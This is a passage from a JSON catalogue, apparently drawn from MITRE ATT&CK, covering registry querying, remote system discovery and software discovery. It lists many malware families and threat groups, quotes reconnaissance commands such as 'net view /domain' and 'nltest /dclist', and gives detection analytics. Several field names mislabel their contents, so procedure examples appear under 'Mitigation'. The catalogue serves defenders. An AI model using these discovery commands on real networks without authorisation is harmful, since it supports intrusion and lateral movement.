        "name": "SodaMaster",
        "description": "SodaMaster has the ability to query the Registry to detect a key specific to VMware.[86]"
      },
      {
        "id": "G0038",
        "name": "Stealth Falcon",
        "description": "Stealth Falcon malware attempts to determine the installed version of .NET by querying the Registry.[87]"
      },
      {
        "id": "S0380",
        "name": "StoneDrill",
        "description": "StoneDrill has looked in the registry to find the default browser path.[88]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet searches the Registry for indicators of security programs.[89]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST collected the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid from compromised hosts.[90]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can search for the HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System Registry key to gather system information.[91]"
      },
      {
        "id": "S0242",
        "name": "SynAck",
        "description": "SynAck enumerates Registry keys associated with event logs.[92]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor can query the Registry on compromised hosts using RegQueryValueExA.[93]"
      },
      {
        "id": "S0560",
        "name": "TEARDROP",
        "description": "TEARDROP checked that HKU\\SOFTWARE\\Microsoft\\CTF existed before decoding its embedded payload.[90][94]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "A Threat Group-3390 tool can read and decrypt stored Registry values.[95]"
      },
      {
        "id": "S0668",
        "name": "TinyTurla",
        "description": "TinyTurla can query the Registry for its configuration information.[96]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla surveys a system upon check-in to discover information in the Windows Registry with the reg query command.[37] Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .[97]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can query the Registry, typically HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, to find the key and path to decrypt and load its kernel driver and kernel driver loader.[98]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has used Reg to query the Registry for installed programs.[99][100]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak can use the Registry for code updates and to collect credentials.[101]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "Volgmer checks the system for certain Registry keys.[102]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has queried the Registry on compromised systems, reg query hklm\\software\\, for information on installed software.[103]"
      },
      {
        "id": "S0612",
        "name": "WastedLocker",
        "description": "WastedLocker checks for specific registry keys related to the UCOMIEnumConnections and IActiveScriptParseProcedure32 interfaces.[104]"
      },
      {
        "id": "S0579",
        "name": "Waterbear",
        "description": "Waterbear can query the Registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\" to see if the value OracleOcilib exists.[105]"
      },
      {
        "id": "S0155",
        "name": "WINDSHIELD",
        "description": "WINDSHIELD can gather Registry values.[106]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can search registry keys to identify antivirus programs on an compromised host.[107]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy executes the reg query command to obtain information in the Registry.[108]"
      },
      {
        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda checks for the existence of a Registry key and if it contains certain values.[109]"
      },
      {
        "id": "G0128",
        "name": "ZIRCONIUM",
        "description": "ZIRCONIUM has used a tool to query the Registry for proxy settings.[110]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell can query the netsvc group value data located in the svchost group Registry key.[111]"
      },
      {
        "id": "S1013",
        "name": "ZxxZ",
        "description": "ZxxZ can search the registry of a compromised host.[112]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that may interact with the Windows Registry to gather information about the system, configuration, and installed software.Note: For PowerShell Module logging event id 4103, enable logging for module Microsoft.PowerShell.Management. The New-PSDrive PowerShell cmdlet creates temporary and persistent drives that are mapped to or associated with a location in a data store, such a registry key (PSProvider \"Registry\"). The the Get-ChildItem gets the items in one or more specified locations. By using both, you can enumerate COM objects in one or more specified locations. Analytic 1 - Suspicious Commands  suspicious_commands = filter command_line where  EventId == \"4103\" AND  (CommandName LIKE '%New-PSDrive%' AND        (CommandParameterValue LIKE ‘%Registry%’ OR        CommandParameterValue LIKE '%HKEY_CLASSES_ROOT%' OR        CommandParameterValue LIKE '%HKCR%'))"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls (such as RegOpenKeyExA) that may interact with the Windows Registry to gather information about the system, configuration, and installed software. OS API calls associated with querying the Windows Registry are RegOpenKeyEx , RegOpenUserClassesRoot, RegQueryValueExA, and RegQueryValueExW. Execution of these functions might trigger security log ids such as 4663 (Microsoft Security Auditing). Also monitor for RegOpenUserClassesRoot api to retrieve a handle to the HKEY_CLASSES_ROOT key for a specified user. The returned key has a view of the registry that merges the contents of the HKEY_LOCAL_MACHINE\\Software\\Classes key with the contents of the Software\\Classes keys in the user's registry hive.Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls. Analytic 1 - Suspicious API Callssuspicious_apis = filter api_calls where  ApiName LIKE '%RegOpenKeyEx%' OR  ApiName LIKE '%RegOpenUserClassesRoot%'"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may interact with the Windows Registry to gather information about the system, configuration, and installed software.Note: The New-PSDrive PowerShell cmdlet creates temporary and persistent drives that are mapped to or associated with a location in a data store, such a registry key (PSProvider \"Registry\"). The Get-ChildItem gets the items in one or more specified locations. By using both, you can enumerate COM objects in one or more specified locations.Note for Analytic 3: Replace FilePathToLolbasProcessXX.exe with lolBAS process names that are used by your organization. The number_standard_deviations parameter should be tuned accordingly. Identifying outliers by comparing distance from a data point to the average value against a certain number of standard deviations is recommended for data values that are symmetrical distributed. If your data is not distributed, try a different algorithm such as the Interquartile Range (IQR). Analytic 1 - Suspicious Processes with Registry keys suspicious_processes = filter processes where (EventId == \"1\" OR EventId == \"4688\") AND((ProcessCommandLine LIKE '%reg%' AND ProcessCommandLine LIKE '%query%') OR (ProcessCommandLine LIKE '%Registry%' AND (ProcessCommandLine LIKE '%HKEY_CLASSES_ROOT%' OR ProcessCommandLine '%HKCR%')))  Analytic 2 - reg.exe spawned from suspicious cmd.exe reg_processes = filter processes where (EventId == \"1\" OR EventId == \"4688\") AND (ProcessFilePath LIKE '%reg.exe%' AND ProcessParentFilePath LIKE '%cmd.exe%')cmd_processes = filter command_line where (event_id == \"1\" OR event_id == \"4688\") AND (ProcessFilePath LIKE '%cmd.exe%' AND ProcessParentFilePath NOT LIKE '%explorer.exe%') suspicious_processes = SELECT r.ProcessGuid, r.ProcessFilePath, c.ProcessFilePath AS ProcessParentFilePathFROM reg_processes rINNER JOIN cmd_processes cON r.ProcessParentGuid = c.ProcessGuid Analytic 3 - Rare LolBAS command linescount_lolbas_processes = filter processes where (EventId == \"1\" OR EventId == \"4688\") AND ProcessFilePath IN ('FilePathToLolbasProcess01.exe','FilePathToLolbasProcess02.exe')GROUP BY ProcessFilePathnumber_standard_deviations = 1.5suspicious_processes = SELECT ProcessFilePath, ProcessCount,        AVG(ProcessCount) Over() - STDEV(ProcessCount) Over() * number_standard_deviations as LowerBound FROM count_lolbas_processesWHERE  ProcessCount < LowerBound"
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Access",
        "detects": "Monitor for unexpected process interactions with the Windows Registry (i.e. reads) that may be related to gathering information.Note: For Security Auditing event ids 4656 and 4663, a System Access Control List (SACL) that controls the use of specific access rights such as Enumerate sub-keys and Query key value is required for event generation. Depending on the Registry key you are monitoring, the implementation of a new System Access Control List (SACL) might be required. Depending of Registry key used for the creation of a System Access Control List (SACL), the generation of event ids 4656 and 4663 might be noisy. Analytic 1 - Suspicious Registrysuspicious_registry = filter registry where  (event_id == \"4663\" OR event_id == \"4656\") AND  ObjectType == \"Key\" AND  RegistryKeyPath LIKE '%SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall%' AND   (UserAccessList LIKE '%4435%' OR UserAccessList LIKE '%Enumerate sub-keys%' OR  UserAccessList LIKE '%4432%' OR UserAccessList LIKE '%Query key value%') AND  ProcessFilePath NOT IN ('FilePathToExpectedProcess01.exe','FilePathToExpectedProcess02.exe')"
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Remote System Discovery",
    "Code": "T1018",
    "Description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.Adversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.Adversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).[1][2]",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered systems over LAN connections. OT systems were visible from the IT network   as well, giving adversaries the ability to discover operational assets. [3]"
      },
      {
        "id": "C0025",
        "name": "2016 Ukraine Electric Power Attack",
        "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD.[4]"
      },
      {
        "id": "S0552",
        "name": "AdFind",
        "description": "AdFind has the ability to query Active Directory for computers.[5][6][7][8]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 has a tool that can detect the existence of remote systems.[9][10]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32 has enumerated DC servers using the command net group \"Domain Controllers\" /domain. The group has also used the ping command.[11]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used NBTscan and custom tools to discover remote systems.[12][13][14]"
      },
      {
        "id": "S0099",
        "name": "Arp",
        "description": "Arp can be used to display a host's ARP cache, which may include address resolutions for remote systems.[15][16]"
      },
      {
        "id": "S0093",
        "name": "Backdoor.Oldrea",
        "description": "Backdoor.Oldrea can enumerate and map ICS-specific systems in victim environments.[17]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can use a PowerShell object such as, System.Net.NetworkInformation.Ping to ping a computer.[18]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can enumerate remote systems using  Net View.[19]"
      },
      {
        "id": "S0570",
        "name": "BitPaymer",
        "description": "BitPaymer can use net view to discover remote systems.[20]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "Black Basta can use LDAP queries to connect to AD and iterate over connected workstations.[21]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat can broadcasts NetBIOS Name Service (NBNC) messages to search for servers connected to compromised networks.[22]"
      },
      {
        "id": "S0521",
        "name": "BloodHound",
        "description": "BloodHound can enumerate and collect the properties of domain computers, including domain controllers.[23]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER typically use ping and Net to enumerate systems.[24]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors used the commands net view /all /domain and ping to discover remote systems. They also used PowerView's PowerShell Invoke-ShareFinder script for file share enumeration.[25]"
      },
      {
        "id": "S0335",
        "name": "Carbon",
        "description": "Carbon uses the net view command.[26]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has utilized various scans and queries to find domain controllers and remote services in the target environment.[27]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.[28][29][30]"
      },
      {
        "id": "S0244",
        "name": "Comnie",
        "description": "Comnie runs the net view command"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti has the ability to discover hosts on a target network.[31]"
      },
      {
        "id": "S0488",
        "name": "CrackMapExec",
        "description": "CrackMapExec can discover active IP addresses, along with the machine name, within a targeted network.[32]"
      },
      {
        "id": "G0009",
        "name": "Deep Panda",
        "description": "Deep Panda has used ping to identify other machines of interest.[33]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol can use the ARP table to find remote hosts to scan.[34]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has likely obtained a list of hosts in the victim environment.[35]"
      },
      {
        "id": "S0694",
        "name": "DRATzarus",
        "description": "DRATzarus can search for other machines connected to compromised host and attempt to map the network.[36]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca used the command powershell \"Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list -property * | findstr \"Address\"\" to find the network information of successfully logged-in accounts to discovery addresses of other machines. Earth Lusca has also used multiple scanning tools to discover other machines within the same compromised network.[37]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic uses the net view command on the victim’s machine.[38]"
      },
      {
        "id": "G0053",
        "name": "FIN5",
        "description": "FIN5 has used the open source tool Essential NetTools to map the network and build a list of targets.[39]"
      },
      {
        "id": "G0037",
        "name": "FIN6",
        "description": "FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[40]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has used dsquery and other Active Directory utilities to enumerate hosts; they have also used nltest.exe /dclist to retrieve a list of domain controllers.[41][42]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro has been used to execute net view on a targeted system.[43]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used Angry IP Scanner to detect remote systems.[44]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can collect information about hosts on the victim network.[45]"
      },
      {
        "id": "C0007",
        "name": "FunnyDream",
        "description": "During FunnyDream, the threat actors used several tools and batch files to map victims' internal networks.[46]"
      },
      {
        "id": "G0093",
        "name": "GALLIUM",
        "description": "GALLIUM used a modified version of NBTscan to identify available NetBIOS name servers over the network as well as ping to identify remote systems.[47]"
      },
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM has enumerated domain controllers using net group \"Domain computers\" and nltest /dclist.[48]"
      },
      {
        "id": "S0698",
        "name": "HermeticWizard",
        "description": "HermeticWizard can find machines on the local network by gathering known local IP addresses through DNSGetCacheDataTable, GetIpNetTable,WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY),NetServerEnum,GetTcpTable, and GetAdaptersAddresses.[49]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has used net view to enumerate domain machines.[50]"
      },
      {
        "id": "G0119",
        "name": "Indrik Spider",
        "description": "Indrik Spider has used PowerView to enumerate all Windows Server, Windows Server 2003, and Windows 7 instances in the Active Directory database.[51]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer can enumerate remote computers in the compromised network.[52]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang has used network scanning and enumeration tools, including Ping.[53]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing has used a script to parse files like /etc/hosts and SSH known_hosts to discover remote systems.[54]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs collects a list of available servers with the command net view.[55]"
      },
      {
        "id": "G0077",
        "name": "Leafminer",
        "description": "Leafminer used Microsoft’s Sysinternals tools to gather detailed information about remote systems.[56]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has used Ping for discovery on targeted networks.[57]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass uses scripts to enumerate IP ranges on the victim network. menuPass has also issued the command net view /domain to a PlugX implant to gather information about remote systems on the network.[58][59]"
      },
      {
        "id": "S0233",
        "name": "MURKYTOP",
        "description": "MURKYTOP has the capability to identify remote hosts on connected networks.[60]"
      },
      {
        "id": "G0019",
        "name": "Naikon",
        "description": "Naikon has used a netbios scanner for remote machine identification.[61]"
      },
      {
        "id": "S0590",
        "name": "NBTscan",
        "description": "NBTscan can list NetBIOS computer names.[62][63]"
      },
      {
        "id": "S0039",
        "name": "Net",
        "description": "Commands such as net view can be used in Net to gather information about available remote systems.[64]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT can identify remote hosts on connected networks.[65]"
      },
      {
        "id": "S0359",
        "name": "Nltest",
        "description": "Nltest may be used to enumerate remote domain controllers using options such as /dclist and /dsgetdc.[66]"
      },
      {
        "id": "S0365",
        "name": "Olympic Destroyer",
        "description": "Olympic Destroyer uses Windows Management Instrumentation to enumerate all systems in the network.[67]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors used the net view and ping commands as part of their advanced reconnaissance.[68]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors used nbtscan and ping to discover remote systems, as well as dsquery subnet on a domain controller to retrieve all subnets in the Active Directory.[69]"
      },
      {
        "id": "S0165",
        "name": "OSInfo",
        "description": "OSInfo performs a connection test to discover remote systems in the network[9]"
      },
      {
        "id": "S0097",
        "name": "Ping",
        "description": "Ping can be used to identify remote systems within a network.[70]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT used Nmap for remote system discovery.[71]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can identify remote systems through the net view command.[72][73][74]"
      },
      {
        "id": "S0241",
        "name": "RATANKBA",
        "description": "RATANKBA runs the net view /domain and net view commands.[75]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec can ping or traceroute a remote host.[76]"
      },
      {
        "id": "S0684",
        "name": "ROADTools",
        "description": "ROADTools can enumerate Azure AD systems and devices.[77]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke has looked for IP addresses in the known_hosts file on the infected system and attempted to SSH into them.[78]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD.[79][4]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon scans the C-class subnet of the IPs on the victim's interfaces.[80]"
      },
      {
        "id": "S0063",
        "name": "SHOTPUT",
        "description": "SHOTPUT has a command to list all servers in the domain, as well as one to locate domain controllers on a domain.[81]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence has used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts.[82]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can enumerate and collect the properties of domain computers.[83]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used AdFind to enumerate remote systems.[84]"
      },
      {
        "id": "S0646",
        "name": "SpicyOmelette",
        "description": "SpicyOmelette can identify payment systems, payment gateways, and ATM systems in compromised environments.[85]"
      },
      {
        "id": "S0018",
        "name": "Sykipot",
        "description": "Sykipot may use net view /domain to display hostnames of available systems on a network.[86]"
      },
      {
        "id": "S0586",
        "name": "TAINTEDSCRIBE",
        "description": "The TAINTEDSCRIBE command and execution module can perform target system enumeration.[87]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "Threat Group-3390 has used the net view command.[88]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot can enumerate computers and network devices.[89]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands. Turla has also used net group \"Domain Computers\" /domain, net group \"Domain Controllers\" /domain, and net group \"Exchange Servers\" /domain to enumerate domain computers, including the organization's DC and Exchange Server.[38][90]"
      },
      {
        "id": "S0452",
        "name": "USBferry",
        "description": "USBferry can use net view to gather information about remote systems.[91]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has used multiple methods, including Ping, to enumerate systems on compromised networks.[92][93]"
      },
      {
        "id": "S0366",
        "name": "WannaCry",
        "description": "WannaCry scans its local network segment for remote systems to try to exploit and copy itself to.[94]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has used networkdll for network discovery and psfin specifically for financial and point of sale indicators. Wizard Spider has also used AdFind, nltest/dclist, and PowerShell script Get-DataInfo.ps1 to enumerate domain computers, including the domain controller.[7][95][96][5][97][98]"
      },
      {
        "id": "S0248",
        "name": "yty",
        "description": "yty uses the net view command for discovery.[99]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users.Windows PowerShell log Event ID 4104 (PS script execution) can be used to capture PowerShell script block contents which may contain commands used as a precursor to RDP Hijacking. For example, the following command in a PowerShell script block may be used to enumerate the systems on a network which have RDP access: Find-DomainLocalGroupMember -GroupName \"Remote Desktop Users\" | select -expand ComputerName."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for files (such as /etc/hosts) being accessed that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system.For Windows, Event ID 4663 (An Attempt Was Made to Access An Object) can be used to alert on access attempts of local files that store host data, including C:\\Windows\\System32\\Drivers\\etc\\hosts.For Linux, auditing frameworks such as the audit daemon (auditd) can be used to alert on access attempts of local files that store host data, including /etc/hosts."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Connection Creation",
        "detects": "Monitor for newly constructed network connections associated with pings/scans that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession.[100]"
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Software Discovery",
    "Code": "T1518",
    "Description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",
    "Mitigation": [
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can query the Registry for installed applications.[1]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER has used tools to enumerate software installed on an infected host.[2]"
      },
      {
        "id": "S0482",
        "name": "Bundlore",
        "description": "Bundlore has the ability to enumerate what browser is being used as well as version information for Safari.[3]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower can list the installed applications on a compromised host.[4]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "The Cobalt Strike System Profiler can discover applications through the browser and identify the version of Java the target has.[5]"
      },
      {
        "id": "S0126",
        "name": "ComRAT",
        "description": "ComRAT can check the victim's default browser to determine which process to inject its communications module into.[6]"
      },
      {
        "id": "S0472",
        "name": "down_new",
        "description": "down_new has the ability to gather information on installed applications.[2]"
      },
      {
        "id": "S0384",
        "name": "Dridex",
        "description": "Dridex has collected a list of installed software on the system.[7]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "DustySky lists all installed software for the infected machine.[8]"
      },
      {
        "id": "S0024",
        "name": "Dyre",
        "description": "Dyre has the ability to identify installed programs on a compromised host.[9]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has enumerated programs installed on an infected machine.[10]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant can retrieve a list of applications from the SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths registry key.[11]"
      },
      {
        "id": "G0100",
        "name": "Inception",
        "description": "Inception has enumerated installed software on compromised systems.[12]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can collect information about installed software used by specific users, software executed on user login, and software executed by each system.[13][14]"
      },
      {
        "id": "S0526",
        "name": "KGH_SPY",
        "description": "KGH_SPY can collect information on installed applications.[15]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can check for the Telegram installation directory by enumerating the files on disk.[16]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has searched the compromised system for banking applications.[17][18]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used a PowerShell backdoor to check for Skype connectivity on the target machine.[19]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has searched the victim system for the InstallUtil.exe program and its version.[20]"
      },
      {
        "id": "C0016",
        "name": "Operation Dust Storm",
        "description": "During Operation Dust Storm, the threat actors deployed a file called DeployJava.js to fingerprint installed software on a victim system prior to exploit delivery.[21]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors collected a list of installed software on the infected system.[22]"
      },
      {
        "id": "S0229",
        "name": "Orz",
        "description": "Orz can gather the victim's Internet Explorer version.[23]"
      },
      {
        "id": "S0598",
        "name": "P.A.S. Webshell",
        "description": "P.A.S. Webshell can list PHP server configuration details.[24]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can enumerate a list of installed programs.[25]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can scan victim drives to look for specific banking software on the machine to determine next actions.[26]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter gathered a list of installed software on the infected host.[27]"
      },
      {
        "id": "G1008",
        "name": "SideCopy",
        "description": "SideCopy has collected browser information from a compromised host.[28]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has used tools to enumerate software installed on an infected host.[29][30]"
      },
      {
        "id": "S0623",
        "name": "Siloscape",
        "description": "Siloscape searches for the kubectl binary.[31]"
      },
      {
        "id": "S0646",
        "name": "SpicyOmelette",
        "description": "SpicyOmelette can enumerate running software on a targeted system.[32]"
      },
      {
        "id": "S1042",
        "name": "SUGARDUMP",
        "description": "SUGARDUMP can identify Chrome, Opera, Edge Chromium, and Firefox browsers, including version number, on a compromised host.[33]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can collect a list of installed software from an infected host.[34]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to identify the Internet Explorer (IE) version on an infected host.[35]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper's backdoor could list the infected system's installed software.[36]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has queried the Registry on compromised systems for information on installed software.[37]"
      },
      {
        "id": "G0124",
        "name": "Windigo",
        "description": "Windigo has used a script to detect installed software on targeted systems.[38]"
      },
      {
        "id": "G0112",
        "name": "Windshift",
        "description": "Windshift has used malware to identify installed software.[39]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has utilized the PowerShell script Get-DataInfo.ps1 to collect installed backup software information from a compromised machine.[40]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can collect .NET, PowerShell, and Python information from an infected host.[41]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET uses ps aux with the grep command to enumerate common browsers and system processes potentially impacting XCSSET's exfiltration capabilities.[42]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment."
      },
      {
        "id": "DS0018",
        "dsource": "Firewall",
        "dcomp": "Firewall Enumeration",
        "detects": "Monitor for an extracted list of available firewalls and/or their associated settings/rules (ex: Azure Network Firewall CLI Show commands)"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Firewall Metadata",
        "detects": "Monitor for contextual data about a firewall and activity around it such as name, policy, or status"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls that may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1518.001",
        "name": "Security Software Discovery"
      }
    ],
    "Tactic": "\nDiscovery"
  },
  {
    "Title": "System Information Discovery",
    "Code": "T1082",
